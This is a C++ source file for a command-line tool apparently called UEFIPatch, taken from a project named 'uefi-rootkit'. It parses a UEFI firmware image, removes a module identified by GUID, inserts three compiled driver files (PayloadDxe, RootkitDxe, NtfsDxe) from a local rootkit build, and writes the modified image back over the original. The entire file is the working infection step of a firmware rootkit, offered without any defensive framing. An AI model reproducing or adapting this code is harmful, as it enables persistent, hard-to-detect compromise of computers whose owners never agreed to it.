#include <QCoreApplication>
#include <QString>
#include <QByteArray>
#include <QFile>
#include <QFileInfo>
#include <iostream>
#include <string>

#include "../../deps/UEFITool/basetypes.h"
#include "../../deps/UEFITool/ffs.h"
#include "../../deps/UEFITool/ffsengine.h"

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    a.setOrganizationName("LongSoft");
    a.setOrganizationDomain("longsoft.me");
    a.setApplicationName("UEFIPatch");

    FfsEngine engine;
    TreeModel model;
    const QStringList &args = a.arguments();

    if (argc < 2)
    {
        std::cout << "Specify file to patch" << std::endl;
        return 1;
    }

    auto path = a.arguments().at(1);
    QFileInfo file_info = QFileInfo(path);

    if (!file_info.exists())
    {
        std::cout << "Please select existing file" << std::endl;
        return 1;
    }

    QFile input_file;
    input_file.setFileName(path);

    if (!input_file.open(QFile::ReadOnly))
    {
        std::cout << "Can't open input file for reading" << std::endl;
        return 1;
    }

    QByteArray buffer = input_file.readAll();
    input_file.close();

    if (engine.parseImageFile(buffer))
    {
        std::cout << "Image parsing failed" << std::endl;
        return 1;
    }

    engine.found.clear();
    auto root = engine.treeModel()->index(0, 0);
    engine.findGuidPattern(root, QString("768BEDFD-7B4B-4C9F-B2FF-6377E3387243").toLatin1(), SEARCH_MODE_HEADER);
    for (auto index : engine.found)
    {
        if (engine.remove(index))
        {
            std::cout << "Remove failed" << std::endl;
            return 1;
        }
    }

    engine.found.clear();
    engine.findGuidPattern(root, QString("D6A2CB7F-6A18-4E2F-B43B-9920A733700A").toLatin1(), SEARCH_MODE_HEADER);
    QList<QString> paths = {
        "/home/powware/repos/uefi-rootkit/build/RELEASE_GCC5/FV/Ffs/B139DF93-D5A4-4B5D-9CA8-011AADF42E85PayloadDxe/B139DF93-D5A4-4B5D-9CA8-011AADF42E85.ffs",
        "/home/powware/repos/uefi-rootkit/build/RELEASE_GCC5/FV/Ffs/F7DB0ECE-2847-4C84-9B12-2A11A0CC530CRootkitDxe/F7DB0ECE-2847-4C84-9B12-2A11A0CC530C.ffs",
        "/home/powware/repos/uefi-rootkit/build/RELEASE_GCC5/FV/Ffs/4EEDF1E2-36B7-4083-8304-F6E3EAFFA980NtfsDxe/4EEDF1E2-36B7-4083-8304-F6E3EAFFA980.ffs"};
    for (auto path : paths)
    {
        QFile file(path);
        if (!file.open(QFile::ReadOnly))
        {
            std::cout << "Can't open output file for reading" << std::endl;
            return 1;
        }

        
        if (engine.insert(engine.found.back(), file.readAll(), CREATE_MODE_AFTER))
        {
            std::cout << "Insertion failed" << std::endl;
            return 1;
        }
    }

    QByteArray reconstructed;
    if(engine.reconstructImageFile(reconstructed))
    {
        std::cout << "Image reconstruction failed" << std::endl;
        return 1;
    }

    QFile output;
    output.setFileName(path);
    if (!output.open(QFile::WriteOnly))
    {
        std::cout << "Can't open output file for rewriting" << std::endl;
        return 1;
    }

    output.resize(0);
    output.write(reconstructed);
    output.close();

    return 0;
}
